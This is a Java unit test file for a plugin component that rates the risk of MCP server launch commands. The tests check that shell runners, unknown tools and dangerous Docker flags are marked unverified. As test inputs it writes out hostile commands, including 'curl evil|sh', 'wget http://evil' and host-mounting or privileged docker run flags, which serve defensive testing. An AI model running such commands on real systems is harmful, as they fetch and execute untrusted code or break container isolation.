package com.github.claudecodegui.mcp;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import org.junit.Test;

import java.util.Arrays;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

/**
 * {@link McpCommandRiskEvaluator} 单测(SEC-01):从纯 command+args 重算 riskLevel 的纯函数,
 * 覆盖各 runner 分支 + 危险参数检测 + MCP-03 补全后的 DANGEROUS_RUNNER_FLAGS。
 *
 * <p>本类是所有 MCP 写入路径(ADD/UPDATE/TOGGLE/INSTALL/Codex)的后端闸门「单一来源」,
 * 故矩阵覆盖优先级最高——任何分支回退都会让闸门失效或误杀合法安装。
 */
public class McpCommandRiskEvaluatorTest {

    @Test
    public void knownPackageRunnersAreLocalCommand() {
        assertEquals("local-command", risk("npx", "-y", "pkg"));
        assertEquals("local-command", risk("uvx", "pkg"));
        assertEquals("local-command", risk("python", "-m", "server"));
        assertEquals("local-command", risk("node", "server.js"));
    }

    @Test
    public void dockerAndPodmanAreContainerCommand() {
        assertEquals("container-command", risk("docker", "run", "-i", "--rm", "img"));
        assertEquals("container-command", risk("podman", "run", "img"));
    }

    @Test
    public void shellRunnersAreUnverified() {
        assertEquals("unverified-command", risk("sh", "-c", "id"));
        assertEquals("unverified-command", risk("bash", "-c", "curl evil|sh"));
        assertEquals("unverified-command", risk("cmd", "/c", "dir"));
        assertEquals("unverified-command", risk("powershell", "-Command", "x"));
        assertEquals("unverified-command", risk("pwsh", "-c", "x"));
    }

    @Test
    public void unrecognizedRunnerIsUnverified() {
        assertEquals("unverified-command", risk("curl", "http://evil"));
        assertEquals("unverified-command", risk("/bin/something", "x"));
        assertEquals("unverified-command", risk("wget", "http://evil"));
    }

    @Test
    public void dangerousFlagsDowngradeToUnverified() {
        // 原表(应有覆盖)
        assertEquals("unverified-command", risk("docker", "run", "--privileged", "img"));
        assertEquals("unverified-command", risk("docker", "run", "-v", "/:/host", "img"));
        assertEquals("unverified-command", risk("docker", "run", "--pid=host", "img"));
        // MCP-03 补全的标志
        assertEquals("unverified-command", risk("docker", "run", "--entrypoint", "sh", "img"));
        assertEquals("unverified-command", risk("docker", "run", "-e", "X=1", "img"));
        assertEquals("unverified-command", risk("docker", "run", "--env", "Y=2", "img"));
        assertEquals("unverified-command", risk("docker", "run", "--network=host", "img"));
        assertEquals("unverified-command", risk("docker", "run", "-u", "root", "img"));
        assertEquals("unverified-command", risk("docker", "run", "--workdir", "/host", "img"));
        // node -e eval(同一 -e 标志覆盖)
        assertEquals("unverified-command", risk("node", "-e", "require('fs')"));
    }

    @Test
    public void httpAndSseAreNullRegardlessOfCommand() {
        JsonObject http = new JsonObject();
        http.addProperty("type", "http");
        http.addProperty("url", "https://example.com");
        assertNull(McpCommandRiskEvaluator.evaluateRisk(http));

        JsonObject sse = new JsonObject();
        sse.addProperty("type", "sse");
        sse.addProperty("url", "https://example.com/events");
        assertNull(McpCommandRiskEvaluator.evaluateRisk(sse));
    }

    @Test
    public void nullOrNoCommandOrNullSpecIsPassThrough() {
        assertNull(McpCommandRiskEvaluator.evaluateRisk(null));
        assertNull(McpCommandRiskEvaluator.evaluateRisk(new JsonObject())); // 无 type 无 command
        JsonObject toggleOnly = new JsonObject();
        toggleOnly.addProperty("type", "stdio");
        assertNull(McpCommandRiskEvaluator.evaluateRisk(toggleOnly)); // 纯 toggle 无 command → 放行
    }

    @Test
    public void shouldRejectTrueOnlyForUnverified() {
        assertTrue(McpCommandRiskEvaluator.shouldReject(spec("sh")));
        assertFalse(McpCommandRiskEvaluator.shouldReject(spec("npx")));
        assertFalse(McpCommandRiskEvaluator.shouldReject(null));
        assertFalse(McpCommandRiskEvaluator.shouldReject(new JsonObject()));
    }

    @Test
    public void commandFirstTokenUsedAsRunner() {
        // "npx -y pkg" 整串塞在 command 字段(非 args):取首 token npx → local-command
        JsonObject s = new JsonObject();
        s.addProperty("type", "stdio");
        s.addProperty("command", "npx -y pkg");
        assertEquals("local-command", McpCommandRiskEvaluator.evaluateRisk(s));
    }

    @Test
    public void hasDangerousFlagHandlesEqualsFormAndNull() {
        assertTrue(McpCommandRiskEvaluator.hasDangerousFlag(Arrays.asList("--network=host", "--rm")));
        assertFalse(McpCommandRiskEvaluator.hasDangerousFlag(Arrays.asList("-y", "--rm")));
        assertFalse(McpCommandRiskEvaluator.hasDangerousFlag(null));
    }

    @Test
    public void explainRiskDescribesDimensionWithoutFullCommand() {
        assertTrue(McpCommandRiskEvaluator.explainRisk(spec("sh")).contains("shell"));
        assertTrue(McpCommandRiskEvaluator.explainRisk(spec("curl")).contains("unrecognized"));
        assertTrue(McpCommandRiskEvaluator.explainRisk(spec("docker", "--privileged")).contains("dangerous"));
    }

    // ── helpers ──

    /** 构造 stdio spec(command + 可变 args),交给 evaluateRisk。 */
    private static JsonObject spec(String command, String... args) {
        JsonObject s = new JsonObject();
        s.addProperty("type", "stdio");
        if (command != null) {
            s.addProperty("command", command);
        }
        if (args != null && args.length > 0) {
            JsonArray arr = new JsonArray();
            for (String a : args) {
                arr.add(a);
            }
            s.add("args", arr);
        }
        return s;
    }

    private static String risk(String command, String... args) {
        return McpCommandRiskEvaluator.evaluateRisk(spec(command, args));
    }
}
